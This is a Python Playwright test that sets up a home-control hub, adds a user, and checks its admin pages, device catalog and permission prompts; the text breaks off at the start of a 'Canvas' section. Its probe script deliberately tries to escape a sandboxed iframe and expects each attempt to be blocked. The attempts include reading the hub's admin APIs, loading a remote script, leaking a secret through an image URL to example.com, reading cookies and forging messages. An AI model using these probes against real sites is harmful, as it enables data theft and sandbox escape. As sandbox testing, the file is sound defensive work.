"""Real-browser check: set up a hub, add a person, and prove their screen is held to its sandbox and its grants.

Needs Python and Playwright, so it is not part of `deno task test`. The easy way to run it:
    tests/browser/run.sh chromium
    tests/browser/run.sh webkit        # the engine Safari is built on
That starts a fresh hub, reads the code it prints, and runs this file against it.

By hand, against a hub that nobody has claimed yet:
    BROWSER=chromium python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 <code> [folder for screenshots]
Set CHROME_PATH to use a Chrome that is already installed. Exits 0 when every check passes.
"""
import asyncio, json, os, sys, urllib.request
from playwright.async_api import async_playwright

base, claim = sys.argv[1].rstrip("/"), sys.argv[2]
shots = sys.argv[3] if len(sys.argv) > 3 else None
OWNER_PIN, SAM_PIN = "482915", "739264"
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = document.baseURI.split("/screens/")[0];
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("ask the hub who is signed in", () => fetch(base + "/auth/me"));
  await attempt("use the superuser's tools", () => fetch(base + "/admin/api/all"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read the session cookie", () => { if (!document.cookie) throw new Error("nothing"); });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

ASK = """([plugin, key, value]) => new Promise((res) => {
  const ref = "probe-" + Math.random();
  addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === ref) res(e.data); });
  parent.postMessage({ type: "set", plugin, key, value, ref }, "*");
  setTimeout(() => res({ timeout: true }), 1500);
})"""

async def main():
    async with async_playwright() as p:
        engine = os.environ.get("BROWSER", "chromium")
        opts = {"args": ["--no-sandbox"]} if engine == "chromium" else {}
        if engine == "chromium" and os.environ.get("CHROME_PATH"): opts["executable_path"] = os.environ["CHROME_PATH"]
        b = await getattr(p, engine).launch(**opts)
        print(f"browser: {engine} {b.version}")
        # One device pixel to a CSS pixel. A sandboxed screen is drawn by a separate process, and Chromium does
        # not always carry a pretended pixel density into it: after a screenshot, a click meant for a screen
        # could land at half its coordinates. With nothing to carry, there is nothing to get out of step.
        phone = dict(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=1)
        errors = []

        # --- The owner sets up the hub ---
        owner_ctx = await b.new_context(**phone)
        owner = await owner_ctx.new_page()
        owner.on("pageerror", lambda e: errors.append(str(e)))
        await owner.goto(base + "/")
        check("a new hub sends everyone to setup", owner.url.endswith("/setup"), owner.url)
        await owner.fill("#code", claim); await owner.fill("#name", "Evan")
        await owner.fill("#secret", OWNER_PIN); await owner.fill("#again", OWNER_PIN)
        if shots: await owner.screenshot(path=f"{shots}/1-setup.png")
        await owner.click("#go"); await owner.wait_for_url("**/admin")
        check("claiming it signs the owner in and lands them where setting up happens", True)
        await owner.wait_for_selector("#setup:not([hidden]) .step")
        todo = await owner.locator("#setup .step:not(.done)").all_inner_texts()
        check("a new owner is shown what is left to do, in order", [t.split("\n")[0] for t in todo] == ["Give a screen a device", "Add your people"], str(todo))
        if shots: await owner.screenshot(path=f"{shots}/1b-first-look.png")

        # --- The admin is five places, each at its own address ---
        async def place(name):
            await owner.locator("#places a", has_text=name).click()
        async def places_shown():
            return await owner.evaluate("() => [...document.querySelectorAll('.place')].filter((p) => !p.hidden).map((p) => p.dataset.place)")
        # A change that hands out power is confirmed once, and that holds for a few minutes.
        async def confirm():
            if await owner.locator("#confirm").count(): await owner.fill("#confirm", OWNER_PIN)
        # Something done from a page: done at once while unlocked, and otherwise asked about once in the dialog.
        async def act():
            await owner.wait_for_timeout(250)
            if await owner.locator("#dlg[open]").count():
                await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("there are five places", await owner.locator("#places a").all_inner_texts() == ["Home", "Devices", "Screens", "People", "Hub"])
        check("a new owner starts at Home, which says how the hub is", await places_shown() == [""] and "Everything is working" in await owner.locator("#homeStatus").inner_text(), await owner.locator("#home").inner_text())
        check("Home lists each device and how it is", await owner.locator("#homeDeviceList a.line").count() == 2 and "Connected to its device" in await owner.locator("#homeDeviceList").inner_text(), await owner.locator("#homeDeviceList").inner_text())
        check("with nothing waiting, nothing claims to need you", not await owner.locator("#needs").is_visible())
        await place("Devices")
        check("choosing a place changes the address and shows only that place", owner.url.endswith("/admin/devices") and await places_shown() == ["devices"] and await owner.title() == "Devices | Skillfully", owner.url)
        await owner.locator("#drivers h3 a", has_text="Simulated switch").click()
        check("each device has a page of its own, at its own address", owner.url.endswith("/admin/devices/sim-switch") and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch" and not await owner.locator("#devicesIntro").is_visible(), owner.url)
        page = await owner.locator("#drivers").inner_text()
        check("the page holds everything about the device, in the order the work happens", [page.index(t) for t in ["Settings", "What it may reach", "Try it", "People can control it", "Screens that use it", "About"]] == sorted(page.index(t) for t in ["Settings", "What it may reach", "Try it", "People can control it", "Screens that use it", "About"]), page)
        await owner.reload(); await owner.wait_for_selector("#deviceTop h2")
        check("which survives loading the page again", await places_shown() == ["devices"] and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch")
        await owner.go_back(); await owner.wait_for_function("() => document.querySelectorAll('#drivers .item').length === 2")
        check("and the back button goes back", owner.url.endswith("/admin/devices"), owner.url)
        await owner.goto(base + "/admin/devices/no-such-thing"); await owner.wait_for_selector("#drivers .item")
        check("an address for a device that is not there says so and shows the ones that are", await owner.locator("#oneDeviceGone").is_visible() and await owner.locator("#drivers .item").count() == 2)
        # --- What is decided about each device is also a text file, and the Hub place says what the files hold ---
        await place("Hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configList p")
        told = await owner.locator("#secConfig").inner_text()
        check("the Hub place says where each device's decisions are kept as text", "/config/devices" in told and "No secret is ever written there" in told, told)
        check("and that the files say what the hub says, when nobody has edited one", "The files say the same as the hub." in told, told)
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        check("an address can be opened directly", await places_shown() == ["people"])
        if shots: await owner.screenshot(path=f"{shots}/1c-people-place.png")
        # On a phone the places are along the bottom, under a thumb. On a wide screen they are down the side.
        size = owner.viewport_size
        bar = await owner.locator("#places").bounding_box()
        check("on a phone the places run along the bottom", bar["width"] > bar["height"] and bar["y"] + bar["height"] >= size["height"] - 1, str(bar))
        await owner.set_viewport_size({"width": 1280, "height": 800})
        bar = await owner.locator("#places").bounding_box(); card = await owner.locator("#secPeople").bounding_box()
        check("on a wide screen they run down the side, clear of the page", bar["height"] > bar["width"] and bar["x"] == 0 and card["x"] >= bar["width"], f"{bar} {card}")
        if shots: await owner.screenshot(path=f"{shots}/1d-wide.png")
        await owner.set_viewport_size(size)

        async def admin(path, body):
            r = await owner_ctx.request.post(base + path, data=json.dumps(body), headers={"content-type": "application/json"})
            return await r.json()
        async def state(plugin):
            return await (await owner_ctx.request.get(f"{base}/api/state?plugin={plugin}")).json()

        # --- The owner adds Sam, through the People page ---
        await owner.goto(base + "/admin/screens")
        # --- A screen reaches nothing until the owner gives it a connection ---
        async def give(screen, *devices):
            item = owner.locator("#screens .item", has=owner.locator("h3", has_text=screen))
            await item.get_by_role("button", name="Choose connections").click()
            for d in devices:
                await owner.locator("#dlgBody label.check", has_text=d).locator("input").check()
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
            return item
        await owner.wait_for_selector("#screens .item")
        fader_item = owner.locator("#screens .item", has=owner.locator("h3", has_text="One fader"))
        check("a new hub has given no screen any connection", "No connections yet" in await fader_item.inner_text(), await fader_item.inner_text())
        await give("One fader", "Simulated board")
        await owner.wait_for_selector("#screens .chip.on:has-text('Simulated board')")
        check("the owner gives One fader the soundboard, with their own PIN", True)
        check("having confirmed once, the page says for how long that holds", await owner.locator("#lockbar").is_visible() and "Unlocked for 5 minutes" in await owner.locator("#lockbar").inner_text(), await owner.locator("#lockbar").inner_text())

        await place("People")
        await owner.fill("#newName", "Sam"); await owner.click("#add button")
        await owner.get_by_text("Add the suggested role Musician").click()
        await owner.wait_for_selector("#roles h3:has-text('Musician')")
        check("a screen's suggested role can be added in one tap", True)
        sam = owner.locator(".item", has=owner.locator("h3", has_text="Sam"))
        await sam.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        check("and the next change is not asked to be confirmed again", await owner.locator("#confirm").count() == 0)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Assign").click()
        check("the People page asks for what the screen's abilities need per person", await owner.locator("#slot_ears").count() == 1)
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Invite").click()
        invite = (await owner.locator("#dlgBody .code").inner_text()).strip()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("an invitation is shown for Sam", len(invite) == 9, invite)
        if shots: await owner.screenshot(path=f"{shots}/2-people.png", full_page=True)

        # --- Sam joins on another phone ---
        sam_ctx = await b.new_context(**phone)
        pg = await sam_ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/")
        check("someone who is not signed in is sent to sign in", pg.url.endswith("/signin"), pg.url)
        # The sign-in page has finished asking the hub what it needs before anything else is typed in the bar.
        await pg.wait_for_selector("#name")
        await pg.goto(f"{base}/join#{invite}")
        await pg.fill("#secret", SAM_PIN); await pg.fill("#again", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader"); await pg.wait_for_timeout(900)
        check("joining lands Sam on the musician's home screen", True)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None): await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")

        # The screen says "ready" once. Whichever of the frame's script and the screen's page arrives first, the
        # screen must end up connected. Here the frame's script is held back, and then the screen's page is.
        async def linked_when_late(what, pattern):
            late = await sam_ctx.new_page()
            async def hold(route):
                await asyncio.sleep(1.5)
                await route.continue_()
            await late.route(pattern, hold)
            await late.goto(f"{base}/s/one-fader")
            ok = True
            try:
                await late.frame_locator("#screen").locator("#linkText", has_text="Connected").wait_for(timeout=8000)
            except Exception:
                ok = False
            check(f"the screen connects when {what} arrives late", ok)
            await late.close()
        await linked_when_late("the frame's own script", "**/_hub/shell.js")
        await linked_when_late("the screen's page", "**/screens/one-fader/index.html")
        check("it knows which ear mix is Sam's", "bus 1" in await fr.inner_text("#inputName"), await fr.inner_text("#inputName"))
        check("the shell shows who is signed in", await pg.inner_text("#who") == "Sam")
        links = await pg.locator("#links a").all_text_contents()
        check("Sam's menu has the ear mix and the account, and no superuser tools", links == ["One fader", "Account"], str(links))

        # Drag the fader. Pointer moves from a mouse reach the page the same way a finger's do, in every engine.
        box = await (await fr.query_selector("#fader")).bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        before = (await state("sim-console"))[LEVEL]
        await pg.mouse.move(xs[0], y); await pg.mouse.down()
        for x in xs[1:]:
            await pg.mouse.move(x, y); await pg.wait_for_timeout(12)
        await pg.mouse.up()
        # What the screen believes the finger chose. A screen's frame can run in its own process, so the last
        # moves may land a moment after the call above returns: give them that moment. The screen ignores the
        # hub's answers for longer than this after a move, so what is read here is still the finger's choice.
        await pg.wait_for_timeout(150)
        chosen = float(await fr.get_attribute("#fader", "aria-valuenow"))
        await pg.wait_for_timeout(900)
        held = (await state("sim-console"))[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        # Engines deliver the last few pointer moves of a fast drag differently, so where the drag ends is
        # allowed a little room. What must hold everywhere: the value the screen settled on is the one the
        # board ends up holding. A lost last move, or an old value snapping back, fails here.
        check("a drag moves the fader to about where the finger stopped", chosen != before and abs(chosen - -10) <= 1.5, f"started at {before}, the screen chose {chosen}")
        check("the board ends up holding what the screen chose", held == chosen, f"the screen chose {chosen}, the board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        log_text = await fr.inner_text("#log")
        check("the screen's history is filled through the bridge, as Sam's own", "You set the level" in log_text, log_text[:80])
        for _ in range(30):
            if "You moved the level from" in await fr.inner_text("#log"): break
            await pg.wait_for_timeout(100)
        log_text = await fr.inner_text("#log")
        check("a drag is in the history as its first step and where it came to rest, not as every position", "You moved the level from Off to" in log_text and log_text.count("You set the level") == 1, log_text[:300])
        if shots: await pg.screenshot(path=f"{shots}/3-sam.png", full_page=True)

        # --- Now behave badly from inside the screen ---
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for things Sam was not granted.
        ack = await fr.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("Sam's screen cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await fr.evaluate(ASK, ["sim-console", "console/input/1/bus/2/level", 10])
        check("Sam's screen cannot touch someone else's ear mix", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", (await state("sim-switch"))["switch/outlet/1/on"] is False)
        check("the other ear mix did not move", (await state("sim-console"))["console/input/1/bus/2/level"] == -90)
        log = await (await owner_ctx.request.get(base + "/api/log?type=skillfully.command.rejected")).json()
        check("both attempts are in the log under Sam's ID", len(log) == 2 and all(e["via"] == "screen/one-fader" and e["actor"].startswith("p_") for e in log), json.dumps(log)[:200])
        check("a screen cannot say it is someone else", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "p_someoneelse" }, "*");
            setTimeout(() => res(true), 500);
        })"""))

        # --- The owner turns Sam off: the phone is cut off at once ---
        people = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["people"]
        sam_id = next(x["id"] for x in people if x["name"] == "Sam")
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": True})
        await pg.wait_for_url("**/signin", timeout=5000)
        check("turning a person off signs their phone out within seconds", True)
        # WebKit reports a refused attempt to leave the sandbox as a page error. That is the sandbox working.
        unexpected = [e for e in errors if "allow-top-navigation" not in e]
        # --- A screen nobody wrote for a device: Controls, given only the switch ---
        await owner.goto(base + "/admin/screens"); await owner.wait_for_selector("#screens .item")
        await give("Controls", "Simulated switch")
        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1200)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        if check("Controls is framed like any other screen", cf is not None):
            cards = await cf.locator(".card h2").all_text_contents()
            check("it shows the switch it was given, and not the soundboard it was not", cards == ["Simulated switch"], str(cards))
            outlet = cf.locator(".row", has_text="switch/outlet/2/on")
            await outlet.get_by_role("button").click(); await owner.wait_for_timeout(700)
            check("pressing a value it was never written for changes the device", (await state("sim-switch"))["switch/outlet/2/on"] is True)
            check("and the screen shows what the device now holds", await outlet.get_by_role("button").inner_text() == "On")
            if shots: await owner.screenshot(path=f"{shots}/4-controls.png", full_page=True)

        # --- Adding a device nobody wrote a driver for, from the store, without leaving the admin page ---
        lamp_port = os.environ.get("LAMP_PORT", "7007")
        await owner.goto(base + "/admin/devices"); await owner.wait_for_selector("#addDevice:not([hidden])")
        await owner.click("#addDevice")
        check("Add a device opens the catalog, at an address of its own", owner.url.endswith("/admin/devices/add") and await places_shown() == ["devices/add"], owner.url)
        await owner.wait_for_selector("#catCompanion:not([hidden]) #catList .maker")
        # Opened straight at that address (a bookmark, or the page loaded again), it is the same catalog.
        await owner.goto(base + "/admin/devices/add")
        await owner.wait_for_selector("#catCompanion:not([hidden]) #catList .maker")
        check("the catalog can be opened at its own address, not only by pressing the button", await places_shown() == ["devices/add"])
        told = await owner.locator("#catalog").inner_text()
        check("Bitfocus Companion modules are a section of their own, with credit and what running one means", "Bitfocus Companion modules" in told and "published by Bitfocus" in told and "asks you before one reaches anything" in told, told)
        check("the hub knows who signed the store's list, so the page does not warn about it", await owner.locator("#catNote").get_attribute("data-unsigned") == "" and "cannot check who published" not in told, told)
        check("with nothing typed, the section lists makers and how many modules each has", "1 module" in await owner.locator("#catList .maker").first.inner_text(), await owner.locator("#catList").inner_text())
        await owner.locator("#catList .maker").first.click(); await owner.wait_for_selector("#catList .catItem")
        shelf = await owner.locator("#catList").inner_text()
        check("a maker opens to its modules, each saying what it is and how far it has been proven", "Test lamp" in shelf and "Tested against a stand-in" in shelf and "All makers" in shelf, shelf)
        await owner.fill("#catFind", "no such thing anywhere"); await owner.wait_for_function("() => document.querySelector('#catNote').textContent.includes('Nothing in the store matches')")
        check("typing something the store does not have says so, and that a file still works", "can still be added from a file" in await owner.locator("#catNote").inner_text())
        await owner.fill("#catFind", "pretend LAMP"); await owner.wait_for_selector("#catList .catItem")
        check("typing finds a module by what it does, whatever the capitals", "Test lamp" in await owner.locator("#catList").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/5a-catalog.png", full_page=True)
        await owner.locator("#catList .catItem", has_text="Test lamp").get_by_role("button", name="Choose").click()
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        told = await owner.locator("#pkgRest").inner_text()
        check("choosing shows what it is, its license, and where it was built from", "skillfully-test-lamp 1.0.0" in told and "MIT license" in told and "its author's source" in told, told)
        check("and what the store lets it do without asking", "The store lets it, without asking you" in told and "you are asked first" in told)
        await owner.fill("#devName", "Stage lamp")
        await owner.locator("#pkgRest label.check", has_text="Controls").locator("input").check()
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/5-add-device.png", full_page=True)
        await owner.click("#dlgOk")
        # Its settings open by themselves, drawn from what the module says it takes.
        await owner.wait_for_selector("#set_host", timeout=15000)
        check("adding ends at the new device's own address", "/admin/devices/companion-skillfully-test-lamp" in owner.url, owner.url)
        check("its settings are on its page, with the module's own labels", "Lamp address" in await owner.locator("#deviceSettings").inner_text() and not await owner.locator("#dlg[open]").count())
        check("and its own defaults", await owner.input_value("#set_port") == "7000")
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        if shots: await owner.screenshot(path=f"{shots}/6-settings.png", full_page=True)
        # The hub asks how things are every few seconds. What is being typed is not drawn over when it does.
        await owner.wait_for_timeout(4500)
        check("what is typed into a device's page stays there while the page keeps itself current", await owner.input_value("#set_host") == "127.0.0.1")
        await owner.locator("#deviceSettings").get_by_role("button", name="Save settings").click()
        lamp_item = owner.locator("#drivers")
        # The store answered for the address it was given, so it connects and nobody is asked anything.
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=15000)
        card = await lamp_item.inner_text()
        check("the page says in plain words that it is connected", "Connected to its device" in card, card)
        check("and where it came from, under what license", "From the store" in card and "MIT license" in card and "Its author's source" in card, card)
        check("it arrives watched only, and the page says what that means", "Off. The hub only watches it, and nothing is sent to it." in card, card)
        check("and says which screen uses it", "Controls uses it." in await owner.locator("#deviceScreens").inner_text(), card)
        # Try it: the device is seen working before anyone is let near it.
        rows = (await (await owner_ctx.request.get(base + "/admin/api/driver/try?id=companion-skillfully-test-lamp")).json())
        turn_on = next(a["label"] for a in rows["actions"] if a["key"] == "generic/action/on")
        power = next(r["label"] for r in rows["readings"] if r["key"] == "generic/reading/power")
        await owner.wait_for_selector("#tryList .reading")
        tried = await owner.locator("#deviceTry").inner_text()
        check("while it is only watched, its page shows what it reports", power in tried and "Its buttons work once people can control it" in tried, tried)
        check("and its buttons are there, and do nothing yet", await owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Do it").is_disabled())
        await lamp_item.get_by_role("button", name="Let people control it").click(); await act()
        await owner.locator("#deviceControl", has_text="On. People with a screen that uses it can change it.").wait_for(timeout=10000)
        check("letting people control it is one tap on its page", True)
        check("a long value a device reports does not make its page wider than the phone", await owner.evaluate("() => document.documentElement.scrollWidth <= innerWidth"), str(await owner.evaluate("() => [document.documentElement.scrollWidth, innerWidth]")))
        do_it = owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Do it")
        await owner.wait_for_function("() => [...document.querySelectorAll('#tryList .action button')].some((b) => !b.disabled)", timeout=10000)
        await do_it.click(); await act()
        await owner.locator("#tryList .reading", has_text=power).locator("b", has_text="on").wait_for(timeout=15000)
        check("then a button on its page really does it, and the reading beside it moves", True)
        # An action that needs something typed in is done from the device's own page, with no screen.
        level_row = owner.locator("#tryList .action", has_text="Set level").first
        check("an action that asks for something first says so, and can be pressed", "It asks for something first" in await level_row.inner_text() and await level_row.get_by_role("button", name="Do it").is_enabled(), await level_row.inner_text())
        await level_row.get_by_role("button", name="Do it").click()
        await owner.locator("#dlg[open] #opt-level").wait_for()
        check("it asks on the page for what the action needs, with the module's note beside it", "Full is 100." in await owner.locator("#dlgBody").inner_text())
        await owner.fill("#opt-level", "30")
        if await owner.locator("#dlg #confirm").count(): await owner.fill("#dlg #confirm", OWNER_PIN)
        await owner.click("#dlgOk")
        await owner.locator("#tryList .reading", has_text="Level").locator("b", has_text="30").wait_for(timeout=15000)
        check("and what was typed reaches the device", True)
        tried = await owner.locator("#tryList").inner_text()
        check("what the module's author put together comes first, under the author's headings", 0 <= tried.find("Levels") < tried.find("Full brightness") < tried.find("Power") < tried.find("Lamp on") < tried.find("Everything else") < tried.find(turn_on), tried)
        check("and a press that is not one plain action is not offered", "Two things at once" not in tried and "not there" not in tried)
        await owner.locator("#tryList .ready", has_text="Full brightness").get_by_role("button", name="Do it").click(); await act()
        await owner.locator("#tryList .reading", has_text="Level").locator("b", has_text="100").wait_for(timeout=15000)
        check("a ready-made button does its action with the options its author chose", True)
        if shots: await owner.screenshot(path=f"{shots}/7a-try-it.png", full_page=True)
        if shots: await lamp_item.scroll_into_view_if_needed(); await owner.screenshot(path=f"{shots}/7-device.png")

        # --- The store publishes a newer version. The hub notices, and updating keeps what was decided ---
        check("a device at the store's version is not offered an update", await lamp_item.get_by_role("button", name="Update to 1.1.0").count() == 0)
        # Straight to this computer, whatever proxy the machine running the test is set up with.
        urllib.request.build_opener(urllib.request.ProxyHandler({})).open(f"http://127.0.0.1:{os.environ.get('STORE_PORT', '7008')}/publish-newer").read()
        await lamp_item.locator(".update").wait_for(timeout=20000)
        check("the page says the store has a newer version", "The store has a newer version, 1.1.0" in await lamp_item.inner_text(), await lamp_item.inner_text())
        await lamp_item.get_by_role("button", name="Update to 1.1.0").click()
        told = await owner.locator("#dlgBody").inner_text()
        check("updating says what stays and what happens", "keeps its name, its settings, and everything you allowed" in told and "used with the real device" in told and "stops for a moment" in told, told)
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/7b-update.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await lamp_item.locator(".update").wait_for(state="detached", timeout=20000)
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=20000)
        card = await lamp_item.inner_text()
        check("after updating it is the new version, connected, still controlled, still on its screen", "1.1.0" in card and "Connected to its device" in card and "On. People with a screen" in card and "Controls uses it." in card, card)

        # --- The same module from a file, which nobody has answered for: it has to ask ---
        await owner.locator("#oneDevice a").click(); await owner.wait_for_selector("#addDevice:not([hidden])")
        check("a device's page leads back to the list, where adding is", owner.url.endswith("/admin/devices") and await owner.locator("#drivers .item").count() == 3, owner.url)
        await owner.click("#addDevice"); await owner.click("#catFile")
        check("nothing can be added before a file is chosen", await owner.locator("#dlgOk").is_disabled())
        await owner.set_input_files("#pkg", os.path.join(os.path.dirname(__file__), "..", "fixtures", "companion", "skillfully-test-lamp-1.0.0.tgz"))
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        facts = await owner.locator("#pkgRest .facts").inner_text()
        check("from a file, it starts with no access to the network", "no access to your network" in facts and "Nobody has reviewed" in facts, facts)
        await owner.fill("#devName", "Spare lamp"); await confirm(); await owner.click("#dlgOk")
        await owner.wait_for_selector("#set_host", timeout=15000)
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        await owner.locator("#deviceSettings").get_by_role("button", name="Save settings").click()
        spare = owner.locator("#drivers")
        await spare.locator("#deviceStatus.wait").wait_for(timeout=15000)
        check("a device that needs something says it is waiting for you", "waiting for you" in await spare.inner_text(), await spare.inner_text())
        check("and holds nothing until you answer", await owner.locator("#deviceReach .grant").count() == 0)
        # Home is where something waiting on the superuser is seen first.
        await place("Home"); await owner.wait_for_selector("#needs:not([hidden]) .need")
        home = await owner.locator("#home").inner_text() + await owner.locator("#needs").inner_text()
        check("Home says something needs you, and what", "One thing needs you" in home and f"Spare lamp asks to reach another program on this computer, port {lamp_port}" in home, home)
        check("with the store's advice beside it", "The store's reviewers advise against this" in home, home)
        check("something the store advises against cannot be allowed with one tap", await owner.locator("#needs").get_by_role("button", name="Allow").count() == 0 and await owner.locator("#needs").get_by_role("button", name="See what it asks for").count() == 1)
        if shots: await owner.screenshot(path=f"{shots}/6a-home-needs-you.png", full_page=True)
        await owner.locator("#needs a.open").click()
        check("and it leads to the device itself", "/admin/devices/" in owner.url and await owner.locator("#deviceTop h2").inner_text() == "Spare lamp", owner.url)
        spare = owner.locator("#drivers")
        asked = await owner.locator("#deviceReach").inner_text()
        check("the question says what it wants in plain words", f"Reach another program on this computer, port {lamp_port}" in asked, asked)
        check("and warns when it is not the ordinary case", "only if you know what is listening there" in asked)
        check("and shows what the store's reviewers advise", "The store's reviewers advise against this" in asked and "run on the hub's own computer yourself" in asked, asked)
        box = owner.locator("#deviceReach .askBox")
        check("nothing unusual is ticked for you", not await box.is_checked())
        await box.check()
        if shots: await owner.screenshot(path=f"{shots}/6b-asks.png", full_page=True)
        await owner.wait_for_timeout(4500)
        check("a tick is not drawn over either, while the page keeps itself current", await box.is_checked())
        await owner.locator("#deviceReach").get_by_role("button", name="Allow what is ticked").click(); await act()
        await spare.locator("#deviceStatus.ok").wait_for(timeout=15000)
        check("what was allowed is listed, with a way to take it away", await owner.locator("#deviceReach .grant").count() == 1 and await owner.locator("#deviceReach").get_by_role("button", name="Take away").count() == 1)
        check("once allowed, it connects", "Connected to its device" in await spare.inner_text())
        # Locking ends the few minutes at once: the next change asks again.
        await owner.click("#lockNow"); await owner.wait_for_selector("#lockbar", state="hidden")
        check("locking hides the unlocked notice", not await owner.locator("#lockbar").is_visible())
        await spare.get_by_role("button", name="Remove").click()
        check("and after locking, a change asks for the PIN again", await owner.locator("#confirm").count() == 1)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => ![...document.querySelectorAll('#drivers h3')].some((h) => h.textContent === 'Spare lamp')")
        check("a device can be removed from the page", True)

        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1500)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        first_rows = await cf.locator(".card", has=cf.locator("h2", has_text="Stage lamp")).locator(".row").all_inner_texts()
        check("Controls shows a device's ready-made buttons before everything else", "Levels: Full brightness" in first_rows[0] and "Power: Lamp on" in " ".join(first_rows[:4]), str(first_rows[:5]))
        on = cf.locator(".row", has_text="generic/action/on")
        await on.get_by_role("button", name="Do it").click()
        reading = cf.locator(".row", has_text="generic/reading/power").locator(".value")
        for _ in range(40):
            if (await reading.inner_text()).strip() == "on": break
            await owner.wait_for_timeout(100)
        check("the device added a minute ago can be used from Controls", (await reading.inner_text()).strip() == "on", await reading.inner_text())
        pair_row = cf.locator(".row", has_text="generic/action/pair")
        check("an action whose only option is a note is a plain button", await pair_row.get_by_role("button", name="Do it").count() == 1 and await pair_row.get_by_role("button", name="Options").count() == 0, await pair_row.inner_text())
        level_row = cf.locator(".row", has_text="generic/action/level")
        await level_row.get_by_role("button", name="Options").click()
        check("a note among an action's options is read, not filled in", "Full is 100." in await level_row.locator(".opts .note").inner_text() and await level_row.locator(".opts input").count() == 1, await level_row.locator(".opts").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/8-controls-lamp.png", full_page=True)

        # --- Canvas: screens put together from JSON, by a person or by whoever can write a file ---
        import re
        everything = await (await owner_ctx.request.get(base + "/admin/api/all")).json()
